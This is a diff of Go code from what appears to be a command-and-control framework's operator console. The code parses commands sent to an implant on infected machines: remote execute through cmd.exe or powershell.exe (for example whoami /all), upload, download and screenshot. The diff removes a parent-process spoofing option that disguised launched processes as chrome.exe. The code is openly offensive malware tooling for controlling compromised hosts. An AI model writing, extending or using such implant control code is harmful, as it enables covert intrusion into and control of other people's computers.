@@ -65,9 +65,9 @@ func ParseImplantCommand(ImplantName, Command string) {
 					"A single space between each argument is required. If the command has multiple subcommand arguments such as: \n"+
 					"powershell.exe -c \"base64 encoded command\" the -c and and the base64 encoded command are placed after the -a switch with a single space between them.\n"+
 					"piped is a boolean value that determines if the command output is piped or not. If the command is piped, the output will be returned to the implant.\n"+
-					"usage: execute -e <program> -a <arguments> (opt) -p <piped> (opt) -s <spoof parent process name> (opt)\n"+
-					"example: execute -e C:\\Windows\\System32\\cmd.exe -a /c whoami /all -p true/false -s chrome.exe\n"+
-					"example: exec -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a whoami /all -p True -s chrome.exe \n", "\n")...)
+					"usage: execute -e <program> -a <arguments> (opt) -p <piped> (opt) \n"+
+					"example: execute -e C:\\Windows\\System32\\cmd.exe -a /c whoami /all -p true/false\n"+
+					"example: exec -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a whoami /all -p True \n", "\n")...)
 				break
 
 			case "download":
@@ -82,7 +82,6 @@ func ParseImplantCommand(ImplantName, Command string) {
 					"Upload a file to the target pc implant is infecting.\n"+
 					"usage: upload <local file location> <remote file location>\n"+
 					"example: upload C:\\Users\\user\\Desktop\\file.txt C:\\Users\\user\\Downloads\\file.txt\n", "\n")...)
-
 				break
 
 			case "screenshot":
@@ -178,11 +177,10 @@ func ParseImplantCommand(ImplantName, Command string) {
 	case "execute", "exec":
 		var (
 			//set argument defaults in-case our user doesn't use any switches.
-			exec        string
-			found       bool
-			arguments   = []string{"null"}
-			piped       = false
-			parentspoof = "null"
+			exec      string
+			found     bool
+			arguments = []string{"null"}
+			piped     = false
 		)
 		//execute a command on the implant.
 		for i := 0; i < len(args); i++ {
@@ -203,15 +201,9 @@ func ParseImplantCommand(ImplantName, Command string) {
 				arguments = []string{}
 				for j := i + 1; j < len(args); j++ {
 					if args[j] == "-p" {
-						arguments = append(arguments, "null")
 						break
 					}
 					if args[j] == "-e" {
-						arguments = append(arguments, "null")
-						break
-					}
-					if args[j] == "-s" {
-						arguments = append(arguments, "null")
 						break
 					}
 					arguments = append(arguments, strings.TrimSpace(args[j]))
@@ -219,17 +211,16 @@ func ParseImplantCommand(ImplantName, Command string) {
 			} else if args[i] == "-e" {
 				exec = args[i+1]
 			} else if args[i] == "-p" {
-				if args[i+1] == "true" || args[i+1] == "True" || args[i+1] == "t" || args[i+1] == "T" {
+				if strings.TrimSpace(args[i+1]) == "true" || strings.TrimSpace(args[i+1]) == "True" ||
+					strings.TrimSpace(args[i+1]) == "t" || strings.TrimSpace(args[i+1]) == "T" {
 					piped = true
 				} else {
 					piped = false
 				}
-			} else if args[i] == "-s" {
-				parentspoof = args[i+1]
 			}
 		}
 
-		args = append([]string{}, "exec:"+exec, "spoof:"+parentspoof, "piped:"+strconv.FormatBool(piped))
+		args = append([]string{}, "exec:"+exec, "piped:"+strconv.FormatBool(piped))
 		args = append(args, arguments...)
 
 		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+exec+" "+strings.Join(arguments, " "), "\n")...)
